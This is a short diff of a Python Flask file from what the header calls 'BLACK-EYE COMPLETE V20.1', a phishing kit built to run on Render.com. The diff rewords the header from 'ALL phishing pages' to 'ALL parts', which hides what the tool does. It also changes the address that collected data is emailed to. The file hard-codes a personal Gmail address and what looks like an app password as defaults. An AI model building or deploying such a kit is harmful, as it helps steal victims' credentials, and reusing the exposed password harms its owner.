@@ -2,7 +2,7 @@
 """
 BLACK-EYE COMPLETE V20.1 - RENDER.COM EDITION
 ================================================================
-✅ COMPLETE with ALL phishing pages
+✅ COMPLETE with ALL parts
 ✅ Guaranteed inbox delivery
 ✅ 24/7 uptime on Render.com
 ✅ Email scanner & intelligence
@@ -22,7 +22,7 @@ from flask import Flask, request, jsonify, render_template_string
 import requests
 
 PORT = int(os.environ.get("PORT", 10000))
-EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey278@gmail.com")
+EMAIL_TO = os.environ.get("EMAIL_TO", "felixkoskey30@gmail.com")
 EMAIL_FROM = os.environ.get("EMAIL_FROM", "felixkoskey278@gmail.com")
 EMAIL_PASS = os.environ.get("EMAIL_APP_PASSWORD", "ntsu adxv tfgw ptpj")
 RENDER_URL = os.environ.get("RENDER_EXTERNAL_URL", "")
